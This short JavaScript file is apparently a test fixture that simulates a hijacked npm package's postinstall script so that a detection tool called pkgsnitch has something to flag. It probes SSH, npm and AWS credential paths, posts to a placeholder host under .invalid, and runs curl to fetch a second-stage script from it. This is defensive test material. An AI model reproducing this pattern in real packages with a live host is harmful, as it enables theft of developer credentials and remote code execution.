'use strict';
// A SIMULATION of what a hijacked package does in its postinstall script.
//
// It is harmless by construction: files are opened and immediately closed
// without their contents being read, nothing is sent anywhere, and the only
// host name used is under `.invalid`, which is reserved by RFC 2606 and can
// never resolve. It exists so that `pkgsnitch diff` has something to catch.

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const { spawnSync } = require('child_process');

const HOST = 'collect.pkgsnitch-demo.invalid';

// 1. Go looking for credentials.
for (const secret of ['.ssh/id_rsa', '.npmrc', '.aws/credentials']) {
  try {
    fs.closeSync(fs.openSync(path.join(os.homedir(), secret), 'r'));
  } catch {
    /* not there */
  }
}

// 2. Phone home.
https
  .request({ host: HOST, path: '/v1/collect', method: 'POST', timeout: 2000 })
  .on('error', () => {})
  .end();

// 3. Try to fetch a second stage with a system tool.
spawnSync('curl', ['-fsSL', `https://${HOST}/stage2.sh`], { stdio: 'ignore', timeout: 3000 });
